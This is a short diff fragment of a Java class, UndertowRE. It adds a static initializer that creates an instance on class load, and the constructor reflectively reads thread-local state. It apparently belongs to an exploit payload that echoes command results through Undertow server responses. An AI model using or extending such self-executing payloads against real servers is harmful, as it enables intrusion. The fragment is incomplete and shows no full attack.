@@ -21,6 +21,9 @@ public class UndertowRE {
     private static String HEADER;
     private static String RHEADER;
 
+    static {
+        new UndertowRE();
+    }
     public UndertowRE() {
         try {
             Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
